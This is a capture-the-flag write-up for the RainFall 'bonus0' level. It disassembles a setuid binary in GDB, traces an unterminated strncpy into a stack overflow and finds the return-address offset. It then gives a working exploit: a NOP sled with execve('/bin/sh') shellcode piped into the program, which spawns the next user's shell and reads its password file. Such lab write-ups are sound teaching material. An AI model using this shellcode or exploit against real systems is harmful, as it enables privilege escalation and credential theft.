```sh
bonus0@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 bonus0 bonus0   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus0 bonus0  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus0 bonus0 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
-rw-r--r--+ 1 bonus0 bonus0   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus0 bonus0  675 Apr  3  2012 .profile
bonus0@RainFall:~$ ./bonus0
 -
4
 -
2
4 2
bonus0@RainFall:~$ ./bonus0 42
 -
42
 -
42
42 42
```
There is one excutable file **bonus0**, it takes standard input twice, and print them with a space. \
\
Run the binary file with GDB.
```sh
(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:     push   %ebp
   0x080484b5 <+1>:     mov    %esp,%ebp
   0x080484b7 <+3>:     sub    $0x1018,%esp # 4120
   0x080484bd <+9>:     mov    0xc(%ebp),%eax
   0x080484c0 <+12>:    mov    %eax,(%esp)
   0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:    movl   $0x1000,0x8(%esp) # size = 4096
   0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:    mov    %eax,0x4(%esp) # buffer[4096]
   0x080484da <+38>:    movl   $0x0,(%esp) # 0 standard input
   0x080484e1 <+45>:    call   0x8048380 <read@plt> # read(fd, buffer, size);
   0x080484e6 <+50>:    movl   $0xa,0x4(%esp) # '\n'
   0x080484ee <+58>:    lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:    mov    %eax,(%esp)
   0x080484f7 <+67>:    call   0x80483d0 <strchr@plt> # strchr(buffer, '\n');
   0x080484fc <+72>:    movb   $0x0,(%eax)
   0x080484ff <+75>:    lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:    movl   $0x14,0x8(%esp) # 20
   0x0804850d <+89>:    mov    %eax,0x4(%esp) # buffer
   0x08048511 <+93>:    mov    0x8(%ebp),%eax
   0x08048514 <+96>:    mov    %eax,(%esp) # second parameter
   0x08048517 <+99>:    call   0x80483f0 <strncpy@plt> # strncpy(char *dest, const char *src, 20);
   0x0804851c <+104>:   leave  
   0x0804851d <+105>:   ret    
End of assembler dump.
```
```sh
(gdb) disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:     push   %ebp
   0x0804851f <+1>:     mov    %esp,%ebp
   0x08048521 <+3>:     push   %edi
   0x08048522 <+4>:     push   %ebx
   0x08048523 <+5>:     sub    $0x50,%esp
   0x08048526 <+8>:     movl   $0x80486a0,0x4(%esp) # 2 param " - "
   0x0804852e <+16>:    lea    -0x30(%ebp),%eax # 0x30 = 48 = 4(변수) + 20(크기)
   0x08048531 <+19>:    mov    %eax,(%esp) # 1 param 20 sized buffe
   0x08048534 <+22>:    call   0x80484b4 <p> # call p(buffer[20], " - ")
   0x08048539 <+27>:    movl   $0x80486a0,0x4(%esp) # 2 param " - "
   0x08048541 <+35>:    lea    -0x1c(%ebp),%eax # 1 param 20 sized buffer 0x30 - 0x1c = 0x14 = 20
   0x08048544 <+38>:    mov    %eax,(%esp)
   0x08048547 <+41>:    call   0x80484b4 <p> # call p(buffer[20], " - ")
   0x0804854c <+46>:    lea    -0x30(%ebp),%eax
   0x0804854f <+49>:    mov    %eax,0x4(%esp) # pp function's 2 parameter
   0x08048553 <+53>:    mov    0x8(%ebp),%eax 
   0x08048556 <+56>:    mov    %eax,(%esp) # pp function's 1 parameter
   0x08048559 <+59>:    call   0x80483a0 <strcpy@plt> # strcpy(1 parameter, 2 parameter)
   0x0804855e <+64>:    mov    $0x80486a4,%ebx # 0x80486a4 = " "
   0x08048563 <+69>:    mov    0x8(%ebp),%eax
   0x08048566 <+72>:    movl   $0xffffffff,-0x3c(%ebp) # 0xffffffff = -1
   0x0804856d <+79>:    mov    %eax,%edx
   0x0804856f <+81>:    mov    $0x0,%eax
   0x08048574 <+86>:    mov    -0x3c(%ebp),%ecx # ecx = -1
   0x08048577 <+89>:    mov    %edx,%edi
   0x08048579 <+91>:    repnz scas %es:(%edi),%al # strlen(const char *s);
   0x0804857b <+93>:    mov    %ecx,%eax
   0x0804857d <+95>:    not    %eax
   0x0804857f <+97>:    sub    $0x1,%eax
   0x08048582 <+100>:   add    0x8(%ebp),%eax
   0x08048585 <+103>:   movzwl (%ebx),%edx
   0x08048588 <+106>:   mov    %dx,(%eax)
   0x0804858b <+109>:   lea    -0x1c(%ebp),%eax
   0x0804858e <+112>:   mov    %eax,0x4(%esp)
   0x08048592 <+116>:   mov    0x8(%ebp),%eax
   0x08048595 <+119>:   mov    %eax,(%esp)
   0x08048598 <+122>:   call   0x8048390 <strcat@plt>
   0x0804859d <+127>:   add    $0x50,%esp
   0x080485a0 <+130>:   pop    %ebx
   0x080485a1 <+131>:   pop    %edi
   0x080485a2 <+132>:   pop    %ebp
   0x080485a3 <+133>:   ret    
End of assembler dump.
```
```sh
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:     push   %ebp
   0x080485a5 <+1>:     mov    %esp,%ebp
   0x080485a7 <+3>:     and    $0xfffffff0,%esp
   0x080485aa <+6>:     sub    $0x40,%esp
   0x080485ad <+9>:     lea    0x16(%esp),%eax
   0x080485b1 <+13>:    mov    %eax,(%esp)
   0x080485b4 <+16>:    call   0x804851e <pp>
   0x080485b9 <+21>:    lea    0x16(%esp),%eax
   0x080485bd <+25>:    mov    %eax,(%esp)
   0x080485c0 <+28>:    call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:    mov    $0x0,%eax
   0x080485ca <+38>:    leave  
   0x080485cb <+39>:    ret    
End of assembler dump.
```
After we look code we can find main function calling pp function with calls p function then recieves input from user with read() to the buffer with size of 4096. \
But function p returns string given by the result of function strncpy() that cuts input by 20 bytes, without checking the proper null termination. \

Then inside function pp it saves into buffer sized 42 the result of p, which is not guaranteed with null termination. \
Here we can find buffer overflow vulnerability and try to manipulate the code flow. \

So let's find out where exactly the overflow happens by checking the value of EIP. \
```sh
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 - 
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
We can see EIP overflows from second standard input, we continue to find offset,
```sh
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 - 
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab
AAAAAAAAAAAAAAAAAAAAaa0aa1aa2aa3aa4aa5aa��� aa0aa1aa2aa3aa4aa5aa���

Program received signal SIGSEGV, Segmentation fault.
0x61336161 in ?? ()

Enter the hex value to find (e.g., 0x63613563): 0x61336161
Little Endian ASCII representation: 'aa3a'
'aa3a' found at offset: 9
```
So the offset is 9, which means by overwriting data from 9'th position we can insert our address to change the program's flow. \
The address we want is start address of buffer, which stores our input (```buffer[4096]```). \
\
Since we have 2 variables with size of 20 bytes and the function ```strcpy``` that uses ```strlen``` will not find null termination in our string, we can try to overwrite buffer and put our shellcode in the overwriteable position, which can be calculated by:
```text
(a[20] + b[20]) + 1 + b[20] = 61 bytes
```
But one thing to remember is we have to set first 61 bytes with ```NOP``` to make CPU able skip those addresses until it can find our shell code. \
So it will something like:
```sh
"\x90" * 61 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```
Now, how do we make program run this shell code block? \
First we have to find the start address of buffer
```sh
...
0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)
0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
...
(gdb) x $ebp - 0x1000 # start address of buffer[4096]
0xbfffe688:     0x00000000
```
With address we found ```0xbfffe688``` we have to add ```61``` bytes to point start of NOP sequence which will finally lead to our shell code
```text
0xbfffe688 + 61 	NOP
0xbfffe688 + ??		NOP
0xbfffe688 + ??		SHELLCODE
```
```sh
(python -c 'print "\x90" * 61 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xc5\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
whoami
bonus1
cat /home/user/bonus1/.pass
(hidden)
```
bonus0 passed !